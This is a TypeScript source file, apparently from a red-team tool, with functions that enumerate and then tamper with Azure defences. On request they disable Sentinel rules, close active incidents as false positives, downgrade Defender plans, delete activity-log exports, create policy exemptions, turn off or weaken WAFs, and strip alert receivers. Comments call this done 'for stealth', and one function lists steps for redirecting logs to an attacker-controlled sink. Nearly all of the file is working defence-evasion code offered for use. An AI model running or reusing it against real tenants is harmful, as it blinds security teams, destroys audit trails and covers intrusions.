import { az, run, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function diagnosticTamper(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action")
  const resourceId = argVal(args, "--resource-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Analyzing Azure diagnostic settings...\n"]

  if (!action) return { output: "[-] --action required (status|disable)", findings }

  if (action === "status") {
    const activityLog = await az(["monitor", "activity-log", "list", "--max-events", "5"], sub, timeout)
    if (activityLog.exitCode === 0) {
      const events = tryJson(activityLog.stdout) || []
      output.push(`[+] Activity log accessible: ${events.length} recent event(s)`)
    }

    const diagnostics = await az(["monitor", "diagnostic-settings", "subscription", "list"], sub, timeout)
    if (diagnostics.exitCode === 0) {
      const settings = tryJson(diagnostics.stdout)?.value || tryJson(diagnostics.stdout) || []
      output.push(`[+] Subscription diagnostic settings: ${Array.isArray(settings) ? settings.length : 0}`)
      if (Array.isArray(settings)) {
        for (const s of settings) {
          output.push(`    ${s.name}: ${s.workspaceId ? "Log Analytics" : ""} ${s.storageAccountId ? "Storage" : ""}`)
        }
      }
      if ((Array.isArray(settings) && settings.length === 0) || !Array.isArray(settings)) {
        findings.push({
          checkId: "AZ-DIAG-001",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: "subscription://diagnostic-settings",
          title: "No subscription diagnostic settings",
          details: "Activity logs are not exported to external storage",
          remediation: "Configure diagnostic settings to send logs to Log Analytics or Storage",
        })
      }
    }

    if (resourceId) {
      const resDiag = await az(["monitor", "diagnostic-settings", "list", "--resource", resourceId], sub, timeout)
      if (resDiag.exitCode === 0) {
        const settings = tryJson(resDiag.stdout)?.value || []
        output.push(`\n[+] Resource diagnostic settings: ${settings.length}`)
      }
    }
  }

  if (action === "disable") {
    output.push(`[!] Disabling diagnostic settings requires specific resource targeting.`)
    output.push(`    Manual commands:`)
    output.push(`    az monitor diagnostic-settings delete --name <SETTING> --resource <RESOURCE_ID>`)
    output.push(`    az monitor diagnostic-settings subscription delete --name <SETTING>`)
  }

  return { output: output.join("\n"), findings }
}

export async function sentinelSuppress(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "status"
  const rg = argVal(args, "--resource-group")
  const workspace = argVal(args, "--workspace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Sentinel analysis...\n"]

  const workspaces = await az(["monitor", "log-analytics", "workspace", "list"], sub, timeout)
  if (workspaces.exitCode !== 0) return { output: "[-] Cannot list Log Analytics workspaces", findings }
  const wsList = tryJson(workspaces.stdout) || []
  output.push(`[+] Log Analytics workspaces: ${wsList.length}`)
  for (const ws of wsList) output.push(`    ${ws.name} (rg: ${ws.resourceGroup}, sku: ${ws.sku?.name || "unknown"})`)

  if (wsList.length === 0) return { output: output.join("\n"), findings }

  const targetWs = workspace || wsList[0]?.name
  const targetRg = rg || wsList[0]?.resourceGroup
  if (!targetWs || !targetRg) return { output: output.join("\n"), findings }

  const rules = await az(
    ["sentinel", "alert-rule", "list", "--resource-group", targetRg, "--workspace-name", targetWs],
    sub,
    timeout,
  )
  if (rules.exitCode === 0) {
    const ruleList = tryJson(rules.stdout) || []
    const enabled = ruleList.filter((r: Record<string, unknown>) => r.enabled !== false)
    const disabled = ruleList.filter((r: Record<string, unknown>) => r.enabled === false)
    output.push(`\n[+] Sentinel analytics rules in ${targetWs}: ${ruleList.length} (${enabled.length} enabled, ${disabled.length} disabled)`)
    for (const r of ruleList.slice(0, 20)) {
      output.push(`    ${r.displayName || r.name} [${r.enabled !== false ? "ENABLED" : "DISABLED"}] severity: ${r.severity || "unknown"}`)
    }
    if (ruleList.length > 20) output.push(`    ... and ${ruleList.length - 20} more`)

    if (enabled.length > 0) {
      findings.push({
        checkId: "AZ-SENTINEL-001",
        provider: "azure",
        severity: "info",
        status: "ENUMERATED",
        resource: `sentinel://${targetWs}`,
        title: `${enabled.length} active Sentinel analytics rules found`,
        details: "These rules may detect attack techniques — consider disabling for stealth",
        remediation: "Re-enable all analytics rules after engagement",
      })
    }
  }

  const incidents = await az(
    ["sentinel", "incident", "list", "--resource-group", targetRg, "--workspace-name", targetWs, "--top", "20"],
    sub,
    timeout,
  )
  if (incidents.exitCode === 0) {
    const incList = tryJson(incidents.stdout) || []
    const active = incList.filter((i: Record<string, unknown>) => i.status === "Active" || i.status === "New")
    output.push(`\n[+] Sentinel incidents: ${incList.length} (${active.length} active/new)`)
    for (const i of incList.slice(0, 10)) {
      output.push(`    #${i.incidentNumber} ${i.title} [${i.status}] severity: ${i.severity}`)
    }
  }

  if (action === "suppress") {
    if (!workspace) return { output: output.join("\n") + "\n\n[-] --workspace required for suppress action", findings }
    const rulesList = tryJson(rules.stdout) || []
    let suppressed = 0
    for (const r of rulesList) {
      if (r.enabled === false) continue
      const disable = await az(
        ["sentinel", "alert-rule", "update", "--resource-group", targetRg, "--workspace-name", targetWs, "--name", r.name, "--enabled", "false"],
        sub,
        timeout,
      )
      if (disable.exitCode === 0) {
        output.push(`[+] Disabled rule: ${r.displayName || r.name}`)
        suppressed++
      }
    }
    if (suppressed > 0) {
      findings.push({
        checkId: "AZ-SENTINEL-002",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `sentinel://${targetWs}`,
        title: `${suppressed} Sentinel analytics rules disabled`,
        details: "SOC will not receive alerts from these rules",
        remediation: `Re-enable rules: az sentinel alert-rule update --enabled true`,
      })
    }
  }

  if (action === "close_incidents") {
    const incList = tryJson(incidents.stdout) || []
    const active = incList.filter((i: Record<string, unknown>) => i.status === "Active" || i.status === "New")
    let closed = 0
    for (const i of active) {
      const close = await az(
        ["sentinel", "incident", "update", "--resource-group", targetRg, "--workspace-name", targetWs, "--incident-id", i.name, "--status", "Closed", "--classification", "FalsePositive"],
        sub,
        timeout,
      )
      if (close.exitCode === 0) {
        output.push(`[+] Closed incident: #${i.incidentNumber} ${i.title}`)
        closed++
      }
    }
    if (closed > 0) {
      findings.push({
        checkId: "AZ-SENTINEL-003",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `sentinel://${targetWs}`,
        title: `${closed} Sentinel incidents closed as FalsePositive`,
        details: "Active incidents hidden from SOC",
        remediation: "Review and reopen closed incidents after engagement",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function defenderDisable(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "status"
  const plan = argVal(args, "--plan")
  const findings: Finding[] = []
  const output: string[] = ["[*] Microsoft Defender for Cloud analysis...\n"]

  const pricing = await az(["security", "pricing", "list"], sub, timeout)
  if (pricing.exitCode !== 0) return { output: "[-] Cannot list Defender pricing plans — may need Security Reader role", findings }

  const plans = tryJson(pricing.stdout)?.value || tryJson(pricing.stdout) || []
  const enabledPlans = plans.filter((p: Record<string, unknown>) => p.pricingTier === "Standard")
  const freePlans = plans.filter((p: Record<string, unknown>) => p.pricingTier === "Free")

  output.push(`[+] Defender plans: ${plans.length} total, ${enabledPlans.length} enabled (Standard), ${freePlans.length} disabled (Free)`)
  output.push("")
  for (const p of plans) {
    const tier = p.pricingTier === "Standard" ? "[ENABLED]" : "[FREE]  "
    output.push(`    ${tier} ${p.name}`)
  }

  if (enabledPlans.length > 0) {
    findings.push({
      checkId: "AZ-DEFENDER-001",
      provider: "azure",
      severity: "info",
      status: "ENUMERATED",
      resource: "defender://plans",
      title: `${enabledPlans.length} Defender plans active — may detect attacks`,
      details: `Enabled: ${enabledPlans.map((p: Record<string, string>) => p.name).join(", ")}`,
      remediation: "Re-enable Defender plans after engagement",
    })
  }

  if (action === "disable") {
    const targets = plan ? [plan] : enabledPlans.map((p: Record<string, string>) => p.name)
    let disabled = 0
    for (const t of targets) {
      const disable = await az(["security", "pricing", "create", "--name", t, "--tier", "Free"], sub, timeout)
      if (disable.exitCode === 0) {
        output.push(`\n[+] Disabled Defender plan: ${t} (Standard → Free)`)
        disabled++
      } else {
        output.push(`\n[-] Failed to disable ${t}: ${disable.stderr.slice(0, 100)}`)
      }
    }
    if (disabled > 0) {
      findings.push({
        checkId: "AZ-DEFENDER-002",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: "defender://plans",
        title: `${disabled} Defender plan(s) disabled`,
        details: `Downgraded to Free tier — threat detection suspended`,
        remediation: `Re-enable: az security pricing create --name PLAN --tier Standard`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function activityLogTamper(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "status"
  const settingName = argVal(args, "--setting-name")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Activity Log diagnostic settings analysis...\n"]

  const subInfo = await az(["account", "show"], sub, timeout)
  const subId = tryJson(subInfo.stdout)?.id || sub || "current"

  const diagSettings = await az(["monitor", "diagnostic-settings", "subscription", "list"], sub, timeout)
  if (diagSettings.exitCode !== 0) {
    output.push("[-] Cannot list subscription diagnostic settings")
    return { output: output.join("\n"), findings }
  }

  const settings = tryJson(diagSettings.stdout)?.value || tryJson(diagSettings.stdout) || []
  output.push(`[+] Subscription-level diagnostic settings: ${settings.length}`)

  for (const s of settings) {
    output.push(`\n    Setting: ${s.name}`)
    if (s.workspaceId) output.push(`      → Log Analytics: ${s.workspaceId.split("/").pop()}`)
    if (s.storageAccountId) output.push(`      → Storage: ${s.storageAccountId.split("/").pop()}`)
    if (s.eventHubAuthorizationRuleId) output.push(`      → Event Hub: ${s.eventHubName || "default"}`)
    const logs = s.logs || []
    const enabled = logs.filter((l: Record<string, unknown>) => l.enabled)
    const disabled = logs.filter((l: Record<string, unknown>) => !l.enabled)
    output.push(`      Logs: ${enabled.length} enabled, ${disabled.length} disabled`)
    for (const l of disabled) output.push(`        [DISABLED] ${l.category}`)
  }

  if (settings.length === 0) {
    findings.push({
      checkId: "AZ-ACTLOG-001",
      provider: "azure",
      severity: "high",
      status: "FAIL",
      resource: `subscription://${subId}/diagnostic-settings`,
      title: "No Activity Log export configured",
      details: "Activity logs only retained 90 days in Azure and not exported",
      remediation: "Configure diagnostic settings to export Activity Logs",
    })
  }

  if (action === "delete" && settingName) {
    const del = await az(
      ["monitor", "diagnostic-settings", "subscription", "delete", "--name", settingName],
      sub,
      timeout,
    )
    if (del.exitCode === 0) {
      output.push(`\n[+] Deleted diagnostic setting: ${settingName}`)
      findings.push({
        checkId: "AZ-ACTLOG-002",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `subscription://${subId}/diagnostic-settings/${settingName}`,
        title: `Activity Log export deleted: ${settingName}`,
        details: "Activity logs no longer exported — operations will not be audited externally",
        remediation: `Recreate the diagnostic setting for Activity Log export`,
      })
    } else {
      output.push(`\n[-] Failed to delete setting: ${del.stderr.slice(0, 200)}`)
    }
  }

  if (action === "redirect") {
    output.push(`\n[!] Activity Log redirection steps:`)
    output.push(`    1. Delete existing setting: az monitor diagnostic-settings subscription delete --name <SETTING>`)
    output.push(`    2. Create new setting pointing to attacker-controlled sink`)
    output.push(`    3. Or modify retention to minimum (1 day)`)
  }

  return { output: output.join("\n"), findings }
}

export async function policyExempt(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "status"
  const assignment = argVal(args, "--policy-assignment")
  const exemptionName = argVal(args, "--name")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Policy analysis...\n"]

  const assignments = await az(["policy", "assignment", "list"], sub, timeout)
  if (assignments.exitCode !== 0) return { output: "[-] Cannot list policy assignments", findings }
  const assignList = tryJson(assignments.stdout) || []
  output.push(`[+] Policy assignments: ${assignList.length}`)

  const enforced = assignList.filter((a: Record<string, unknown>) => a.enforcementMode === "Default")
  const notEnforced = assignList.filter((a: Record<string, unknown>) => a.enforcementMode === "DoNotEnforce")
  output.push(`    Enforced: ${enforced.length}, DoNotEnforce: ${notEnforced.length}`)

  for (const a of assignList.slice(0, 20)) {
    const mode = a.enforcementMode === "DoNotEnforce" ? "[NOT ENFORCED]" : "[ENFORCED]    "
    output.push(`    ${mode} ${a.displayName || a.name}`)
  }
  if (assignList.length > 20) output.push(`    ... and ${assignList.length - 20} more`)

  const exemptions = await az(["policy", "exemption", "list"], sub, timeout)
  if (exemptions.exitCode === 0) {
    const exemptList = tryJson(exemptions.stdout) || []
    if (exemptList.length > 0) {
      output.push(`\n[+] Existing policy exemptions: ${exemptList.length}`)
      for (const e of exemptList) output.push(`    ${e.displayName || e.name} — ${e.exemptionCategory} (assignment: ${e.policyAssignmentId?.split("/").pop()})`)
    }
  }

  if (action === "exempt" && assignment) {
    const name = exemptionName || `cs-exempt-${Date.now()}`
    const create = await az(
      ["policy", "exemption", "create", "--name", name, "--policy-assignment", assignment, "--exemption-category", "Waiver", "--display-name", `CyberStrike waiver: ${name}`],
      sub,
      timeout,
    )
    if (create.exitCode === 0) {
      output.push(`\n[+] Policy exemption created: ${name}`)
      output.push(`    Assignment: ${assignment}`)
      output.push(`    Category: Waiver`)
      findings.push({
        checkId: "AZ-POLICY-001",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `policy-exemption://${name}`,
        title: `Policy exemption created: ${name}`,
        details: `Exempts from policy assignment ${assignment} — security controls bypassed`,
        remediation: `Delete exemption: az policy exemption delete --name ${name}`,
      })
    } else {
      output.push(`\n[-] Failed to create exemption: ${create.stderr.slice(0, 200)}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function wafBypass(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "status"
  const gateway = argVal(args, "--gateway")
  const rg = argVal(args, "--resource-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure WAF analysis...\n"]

  const appGws = await az(["network", "application-gateway", "list"], sub, timeout)
  if (appGws.exitCode === 0) {
    const gws = tryJson(appGws.stdout) || []
    output.push(`[+] Application Gateways: ${gws.length}`)
    for (const gw of gws) {
      const wafEnabled = gw.webApplicationFirewallConfiguration?.enabled
      const wafMode = gw.webApplicationFirewallConfiguration?.firewallMode || "N/A"
      const sku = gw.sku?.name || "unknown"
      output.push(`    ${gw.name} (${sku}) — WAF: ${wafEnabled ? "enabled" : "disabled"}, mode: ${wafMode}, rg: ${gw.resourceGroup}`)
      if (wafEnabled && wafMode === "Detection") {
        findings.push({
          checkId: "AZ-WAF-001",
          provider: "azure",
          severity: "medium",
          status: "FAIL",
          resource: `appgw://${gw.name}`,
          title: `WAF in Detection mode (not blocking): ${gw.name}`,
          details: "Detection mode logs but does not block malicious requests",
          remediation: "Switch WAF to Prevention mode",
        })
      }
      if (!wafEnabled && sku.includes("WAF")) {
        findings.push({
          checkId: "AZ-WAF-002",
          provider: "azure",
          severity: "high",
          status: "FAIL",
          resource: `appgw://${gw.name}`,
          title: `WAF-capable gateway with WAF disabled: ${gw.name}`,
          details: "Gateway has WAF SKU but WAF is not enabled",
          remediation: "Enable WAF on this Application Gateway",
        })
      }
    }
  }

  const fdPolicies = await az(["network", "front-door", "waf-policy", "list"], sub, timeout)
  if (fdPolicies.exitCode === 0) {
    const policies = tryJson(fdPolicies.stdout) || []
    output.push(`\n[+] Front Door WAF policies: ${policies.length}`)
    for (const p of policies) {
      const mode = p.policySettings?.mode || "unknown"
      const state = p.policySettings?.enabledState || "unknown"
      output.push(`    ${p.name} — mode: ${mode}, state: ${state}, rg: ${p.resourceGroup}`)
      if (mode === "Detection") {
        findings.push({
          checkId: "AZ-WAF-003",
          provider: "azure",
          severity: "medium",
          status: "FAIL",
          resource: `frontdoor-waf://${p.name}`,
          title: `Front Door WAF in Detection mode: ${p.name}`,
          details: "Detection mode logs but does not block",
          remediation: "Switch to Prevention mode",
        })
      }
    }
  }

  if (action === "disable" && gateway && rg) {
    const disable = await az(
      ["network", "application-gateway", "waf-config", "set", "--gateway-name", gateway, "--resource-group", rg, "--enabled", "false"],
      sub,
      timeout,
    )
    if (disable.exitCode === 0) {
      output.push(`\n[+] WAF disabled on Application Gateway: ${gateway}`)
      findings.push({
        checkId: "AZ-WAF-004",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `appgw://${gateway}`,
        title: `WAF disabled on ${gateway}`,
        details: "Web application firewall protection removed",
        remediation: `Re-enable: az network application-gateway waf-config set --gateway-name ${gateway} --resource-group ${rg} --enabled true`,
      })
    } else {
      output.push(`\n[-] Failed to disable WAF: ${disable.stderr.slice(0, 200)}`)
    }
  }

  if (action === "detection" && gateway && rg) {
    const weaken = await az(
      ["network", "application-gateway", "waf-config", "set", "--gateway-name", gateway, "--resource-group", rg, "--firewall-mode", "Detection"],
      sub,
      timeout,
    )
    if (weaken.exitCode === 0) {
      output.push(`\n[+] WAF switched to Detection mode on ${gateway} — requests logged but not blocked`)
      findings.push({
        checkId: "AZ-WAF-005",
        provider: "azure",
        severity: "high",
        status: "EXPLOITED",
        resource: `appgw://${gateway}`,
        title: `WAF downgraded to Detection mode: ${gateway}`,
        details: "WAF now logs but does not block malicious requests",
        remediation: `Restore: az network application-gateway waf-config set --gateway-name ${gateway} --resource-group ${rg} --firewall-mode Prevention`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function alertSuppress(args: string[], timeout: number): Promise<HookResult> {
  const sub = argVal(args, "--subscription-id")
  const action = argVal(args, "--action") || "status"
  const rg = argVal(args, "--resource-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Azure Monitor alerts analysis...\n"]

  const metricAlerts = await az(["monitor", "metrics", "alert", "list"], sub, timeout)
  if (metricAlerts.exitCode === 0) {
    const alerts = tryJson(metricAlerts.stdout) || []
    const enabled = alerts.filter((a: Record<string, unknown>) => a.enabled !== false)
    const disabled = alerts.filter((a: Record<string, unknown>) => a.enabled === false)
    output.push(`[+] Metric alerts: ${alerts.length} (${enabled.length} enabled, ${disabled.length} disabled)`)
    for (const a of alerts.slice(0, 15)) {
      output.push(`    ${a.enabled !== false ? "[ON] " : "[OFF]"} ${a.name} — severity: ${a.severity}, rg: ${a.resourceGroup}`)
    }
    if (alerts.length > 15) output.push(`    ... and ${alerts.length - 15} more`)
  }

  const actionGroups = await az(["monitor", "action-group", "list"], sub, timeout)
  if (actionGroups.exitCode === 0) {
    const groups = tryJson(actionGroups.stdout) || []
    output.push(`\n[+] Action groups: ${groups.length}`)
    for (const g of groups) {
      const receivers = [
        ...(g.emailReceivers || []).map((r: Record<string, string>) => `email:${r.emailAddress}`),
        ...(g.smsReceivers || []).map((r: Record<string, string>) => `sms:${r.phoneNumber}`),
        ...(g.webhookReceivers || []).map((r: Record<string, string>) => `webhook:${r.serviceUri?.substring(0, 40)}`),
      ]
      output.push(`    ${g.groupShortName || g.name} (${g.enabled !== false ? "enabled" : "disabled"}): ${receivers.join(", ") || "no receivers"}`)
    }

    const withReceivers = groups.filter((g: Record<string, unknown[]>) =>
      (g.emailReceivers?.length || 0) > 0 || (g.smsReceivers?.length || 0) > 0 || (g.webhookReceivers?.length || 0) > 0
    )
    if (withReceivers.length > 0) {
      findings.push({
        checkId: "AZ-ALERT-001",
        provider: "azure",
        severity: "info",
        status: "ENUMERATED",
        resource: "monitor://action-groups",
        title: `${withReceivers.length} action groups with notification receivers`,
        details: "These groups send alerts to security team — suppress for stealth",
        remediation: "Restore action group receivers after engagement",
      })
    }
  }

  const logAlerts = await az(["monitor", "scheduled-query", "list"], sub, timeout)
  if (logAlerts.exitCode === 0) {
    const rules = tryJson(logAlerts.stdout) || []
    output.push(`\n[+] Log search alert rules: ${rules.length}`)
    for (const r of rules.slice(0, 10)) {
      output.push(`    ${r.enabled !== false ? "[ON] " : "[OFF]"} ${r.displayName || r.name}`)
    }
  }

  if (action === "disable_alerts") {
    const alerts = tryJson(metricAlerts.stdout) || []
    let disabled = 0
    for (const a of alerts) {
      if (a.enabled === false) continue
      const dis = await az(
        ["monitor", "metrics", "alert", "update", "--name", a.name, "--resource-group", a.resourceGroup, "--enabled", "false"],
        sub,
        timeout,
      )
      if (dis.exitCode === 0) {
        output.push(`[+] Disabled alert: ${a.name}`)
        disabled++
      }
    }
    if (disabled > 0) {
      findings.push({
        checkId: "AZ-ALERT-002",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: "monitor://metric-alerts",
        title: `${disabled} metric alert(s) disabled`,
        details: "Security team will not receive metric-based notifications",
        remediation: "Re-enable metric alerts after engagement",
      })
    }
  }

  if (action === "clear_action_group" && rg) {
    const agName = argVal(args, "--action-group")
    if (!agName) return { output: output.join("\n") + "\n\n[-] --action-group required for clear_action_group", findings }
    const clear = await az(
      ["monitor", "action-group", "update", "--name", agName, "--resource-group", rg, "--remove-action", "email", "sms", "webhook"],
      sub,
      timeout,
    )
    if (clear.exitCode === 0) {
      output.push(`\n[+] Cleared receivers from action group: ${agName}`)
      findings.push({
        checkId: "AZ-ALERT-003",
        provider: "azure",
        severity: "critical",
        status: "EXPLOITED",
        resource: `action-group://${agName}`,
        title: `Action group receivers cleared: ${agName}`,
        details: "Alerts routed through this group will not reach anyone",
        remediation: `Restore receivers to action group ${agName}`,
      })
    } else {
      output.push(`\n[-] Failed to update action group: ${clear.stderr.slice(0, 200)}`)
    }
  }

  return { output: output.join("\n"), findings }
}
